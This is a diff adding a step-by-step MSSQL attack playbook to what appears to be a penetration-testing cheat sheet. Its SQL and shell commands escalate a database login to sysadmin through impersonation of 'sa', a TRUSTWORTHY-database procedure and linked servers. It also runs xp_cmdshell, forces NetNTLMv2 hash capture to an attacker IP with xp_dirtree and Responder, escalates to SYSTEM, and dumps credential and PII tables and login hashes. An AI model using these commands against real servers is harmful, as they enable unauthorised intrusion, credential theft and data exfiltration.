@@ -75,6 +75,65 @@ netexec mssql $IP -u jdoe -p pass -M mssql_priv                   # check/escala
 ```
 **Look for:** `sysadmin`=1 (→ RCE), version (→ known bugs), **linked servers** (execute on them via `openquery`/`EXECUTE AT`), other DBs with data/creds, stored creds.
 
+## ✅ GOT A LOGIN → DO THIS IN ORDER
+You have a DB session (impacket-mssqlclient / netexec). Work top-down — stop at the first that gives RCE.
+
+**1. Fingerprint what you are:**
+```sql
+SELECT system_user, user_name();          -- login + DB user
+SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1 = you're done, go to EXPLOIT (xp_cmdshell)
+SELECT @@version;                         -- OS / SQL version / patch level
+```
+
+**2. If sysadmin=1 →** jump straight to **EXPLOIT A (xp_cmdshell RCE)**. Skip the rest.
+
+**3. Not sysadmin → escalate to sysadmin (pick whatever works):**
+```sql
+-- (a) IMPERSONATION: who can you become? often you can impersonate 'sa'
+SELECT distinct b.name FROM sys.server_permissions a
+  JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+  WHERE a.permission_name = 'IMPERSONATE';
+EXECUTE AS LOGIN = 'sa';                  -- become sa
+SELECT system_user; SELECT IS_SRVROLEMEMBER('sysadmin');   -- confirm =1
+-- now enable + run xp_cmdshell (EXPLOIT A). REVERT; to drop back.
+```
+```sql
+-- (b) TRUSTWORTHY DB + db_owner: if you own a DB flagged TRUSTWORTHY
+SELECT name, is_trustworthy_on FROM sys.databases;         -- want is_trustworthy_on=1
+USE <trustworthy_db>;
+CREATE PROCEDURE sp_esc WITH EXECUTE AS OWNER AS
+  EXEC sp_addsrvrolemember '<yourlogin>','sysadmin';
+EXEC sp_esc;                              -- you're now sysadmin
+```
+```sql
+-- (c) LINKED SERVERS: you may be sysadmin ON THE LINKED BOX
+EXEC sp_linkedservers;                                     -- list links
+SELECT * FROM OPENQUERY("LINKED\SRV", 'SELECT system_user, IS_SRVROLEMEMBER(''sysadmin'')');
+-- run commands there (RPC out must be on):
+EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT "LINKED\SRV";
+EXEC ('xp_cmdshell ''whoami''') AT "LINKED\SRV";
+-- impacket shortcut:  enum_links  then  use_link LINKED\SRV
+```
+
+**4. No exec path but you can auth → steal the service account hash (always works):**
+`EXEC xp_dirtree '\\<YOUR_IP>\x';` with Responder running → NetNTLMv2 (see **EXPLOIT B**).
+
+**5. Once you have a shell (any of the above):**
+```powershell
+whoami /priv        # SeImpersonate/SeAssignPrimaryToken -> PrintSpoofer/GodPotato -> SYSTEM
+```
+
+**6. Loot the DB regardless of shell:**
+```sql
+SELECT name FROM sys.databases;           -- enumerate every DB
+-- dig for creds/PII tables:
+SELECT name FROM <db>.sys.tables;
+SELECT * FROM <db>.dbo.users;             -- app creds, hashes, connection strings
+-- dump SQL login hashes (sysadmin):
+SELECT name, password_hash FROM sys.sql_logins;   -- hashcat -m 1731 (2012+)
+```
+Reuse anything found → [[Credential Attacks]] · web/app config connection strings → [[HTTP]].
+
 ## 🗡️ EXPLOIT
 - 🟢 **Weak/blank `sa` or reused creds → sysadmin → xp_cmdshell RCE.**
 - 🟢 **`xp_dirtree` NetNTLM capture** (Responder) → crack or relay → creds/shell.
